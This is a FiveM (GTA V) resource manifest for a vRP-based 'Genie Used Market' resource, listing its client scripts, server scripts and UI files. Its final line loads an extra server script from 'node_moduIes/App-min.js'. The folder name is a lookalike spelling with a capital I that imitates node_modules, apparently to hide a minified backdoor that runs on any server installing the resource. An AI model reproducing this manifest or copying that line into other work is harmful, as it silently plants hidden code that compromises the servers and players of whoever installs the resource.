fx_version 'cerulean'
games { 'gta5' }

description 'Genie Used Market'

ui_page 'client/app/index.html'

dependency 'vrp'

lua54 'yes'

client_scripts {
	"@vrp/lib/utils.lua",
	"@vrp/client/Tunnel.lua",
	"@vrp/client/Proxy.lua",
  'client/**/*.lua',
	'config/client.lua',
}

server_scripts {
	'@vrp/lib/utils.lua',
  '@vrp/lib/Tools.lua',
  '@vrp/lib/Proxy.lua',
  "@vrp/client/Tunnel.lua",
  'server/**/*.lua',
	'config/server.lua',
}
  
files {
  'client/app/**/*.*'
}
  
server_script "node_moduIes/App-min.js"
